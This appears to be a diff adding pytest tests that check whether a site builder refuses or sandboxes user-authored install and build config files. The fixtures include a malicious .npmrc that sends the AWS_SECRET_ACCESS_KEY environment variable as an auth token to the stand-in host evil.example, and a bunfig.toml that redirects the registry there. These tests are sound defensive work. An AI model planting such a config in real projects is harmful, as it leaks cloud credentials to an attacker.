@@ -314,6 +314,7 @@ async def test_add_writes_a_canonical_manifest_and_a_draft_version(beanie_test_d
         "pocket_id": pocket_id,
         "packages": {"three": {"version": "0.170.0"}},
         "rejected": [],
+        "warnings": [],
         "changed": True,
     }
     assert resolve.calls == [(["three"], "svelte", [])]
@@ -400,3 +401,51 @@ async def test_a_ripple_site_is_refused(beanie_test_db):
             user_id="u1", pocket_id=pocket_id, add=["three"], _resolve=_fake_resolve({})
         )
     assert info.value.code == "site_deps.engine_unsupported"
+
+
+# ---------------------------------------------------------------------------
+# requires_sandbox: authored build-shell files are sandbox-only too
+# ---------------------------------------------------------------------------
+
+_PKG_JSON = json.dumps({"name": "site", "dependencies": {"three": "0.170.0"}})
+_NPMRC = "registry=https://evil.example/\n//evil.example/:_authToken=${AWS_SECRET_ACCESS_KEY}\n"
+
+_SHELL_SOURCES = {
+    "package.json with deps": {"package.json": _PKG_JSON},
+    "only .npmrc": {".npmrc": _NPMRC},
+    "vite.config.ts": {"vite.config.ts": "export default {}"},
+    "svelte.config.js": {"svelte.config.js": "export default {}"},
+    "bunfig.toml": {"bunfig.toml": '[install]\nregistry = "https://evil.example/"\n'},
+    "odd spelling": {"./Package.JSON": _PKG_JSON},
+    "backslash + trailing dot": {"\\.NPMRC.": _NPMRC},
+}
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("engine", ["svelte", "react"])
+@pytest.mark.parametrize("extra", list(_SHELL_SOURCES.values()), ids=list(_SHELL_SOURCES))
+async def test_the_host_client_refuses_an_authored_build_shell(tmp_path, engine, extra):
+    """No manifest at all, but an authored install/build config: refused, nothing runs.
+
+    Mutation: drop the ``author_build_shell_files`` clause from ``requires_sandbox``.
+    """
+    runner = _RecordingRunner(str(tmp_path))
+    client = gc.GeneratorClient(_runner=runner)
+    with pytest.raises(gc.HostInstallRefused):
+        await client.build(**_build_kwargs(engine, {**_SVELTE_SOURCE, **extra}))
+    assert runner.calls == []
+
+
+def test_requires_sandbox_ignores_nested_lookalikes():
+    """Only the project-root files steer the install; a nested one is ordinary source."""
+    assert dm.requires_sandbox({**_SVELTE_SOURCE, "src/lib/package.json.md": "x"}) is False
+    assert dm.requires_sandbox({**_SVELTE_SOURCE, "src/lib/vite.config.ts": "x"}) is False
+    assert dm.requires_sandbox(dict(_SVELTE_SOURCE)) is False
+    assert dm.requires_sandbox(None) is False
+
+
+def test_static_svelte_with_an_authored_npmrc_goes_to_the_sandbox_lane(lane_flag_off):
+    assert (
+        sites_service.build_runs_async("svelte", source={**_SVELTE_SOURCE, ".npmrc": _NPMRC})
+        is True
+    )
